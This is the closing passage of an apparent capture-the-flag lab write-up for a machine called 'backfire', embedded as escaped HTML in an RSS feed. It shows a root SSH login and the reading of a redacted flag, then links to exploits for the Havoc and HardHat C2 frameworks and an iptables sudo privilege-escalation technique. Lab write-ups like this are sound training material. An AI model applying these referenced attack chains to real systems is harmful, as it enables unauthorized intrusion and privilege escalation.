+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="p">~&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">id_ed25519&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">a7b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="mi">74&lt;/span>&lt;span class="nx">e&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;h2 id="resources">Resources
+&lt;/h2>&lt;blockquote>
+&lt;p>&lt;a class="link" href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noopener"
+>GitHub Repo for the Havoc C2 Framework&lt;/a>&lt;br>
+&lt;a class="link" href="https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE" target="_blank" rel="noopener"
+>GitHub Repo for the Havoc C2 SSRF + RCE Exploit&lt;/a>&lt;br>
+&lt;a class="link" href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7" target="_blank" rel="noopener"
+>Medium Article for the HardHat C2 Exploit&lt;/a>&lt;br>
+&lt;a class="link" href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" target="_blank" rel="noopener"
+>Article Explaining How to Exploit iptables and iptables-save via a sudo Misconfiguration&lt;/a>&lt;/p>&lt;/blockquote></description></item></channel></rss>
